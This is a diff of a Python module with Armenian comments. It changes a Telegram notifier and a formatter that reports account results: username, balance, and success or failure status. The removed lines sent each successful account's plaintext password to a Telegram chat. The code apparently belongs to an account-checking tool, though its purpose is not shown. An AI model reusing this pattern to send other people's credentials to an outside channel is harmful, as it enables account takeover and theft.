@@ -718,18 +718,21 @@ CONFIG = {
 import httpx
 
 async def send_to_telegram(message: str):
-    """Ուղարկել հաղորդագրություն Telegram բոտին"""
-    if not CONFIG["send_to_telegram"]:
+    if not CONFIG.get("send_to_telegram"):
         return
-    if not CONFIG["telegram_token"] or not CONFIG["telegram_chat_id"]:
+
+    token = CONFIG.get("telegram_token")
+    chat_id = CONFIG.get("telegram_chat_id")
+
+    if not token or not chat_id:
         logger.warning("Telegram credentials not configured")
         return
-    
+
     try:
-        url = f"https://api.telegram.org/bot{CONFIG['telegram_token']}/sendMessage"
+        url = f"https://api.telegram.org/bot{token}/sendMessage"
         async with httpx.AsyncClient(timeout=10) as client:
             await client.post(url, json={
-                "chat_id": CONFIG["telegram_chat_id"],
+                "chat_id": chat_id,
                 "text": message,
                 "parse_mode": "HTML"
             })
@@ -737,28 +740,25 @@ async def send_to_telegram(message: str):
         logger.error(f"Telegram send error: {e}")
 
 
-def format_account_message(account: Account) -> str:
-    """Ֆորմատավորել հաշվի տվյալները Telegram-ի համար"""
-    status_emoji = {
-        AccountStatus.SUCCESS: "✅",
-        AccountStatus.FAILED: "❌",
-        AccountStatus.TIMEOUT: "⏰"
-    }
-    
-    if account.status == AccountStatus.SUCCESS:
-        return f"""
-🔐 <b>Ակաունտ</b>
-└ 👤 <code>{account.username}</code>
-└ 🔑 <code>{account.password}</code>
-└ 💰 {account.balance}
-└ 📅 {account.timestamp[:19]}
+def format_account_message(account):
+    try:
+        ts = getattr(account, "timestamp", "")[:19]
+        err = getattr(account, "error", "N/A")[:50]
+
+        if account.status == AccountStatus.SUCCESS:
+            return f"""
+🔐 Ակաունտ
+👤 {account.username}
+💰 {account.balance}
+📅 {ts}
 """
-    else:
         return f"""
-{status_emoji[account.status]} <b>{account.username}</b>
-└ ❌ {account.error[:50]}
-└ 📅 {account.timestamp[:19]}
+❌ {account.username}
+Error: {err}
+📅 {ts}
 """
+    except Exception:
+        return "Format error"
 
 
 
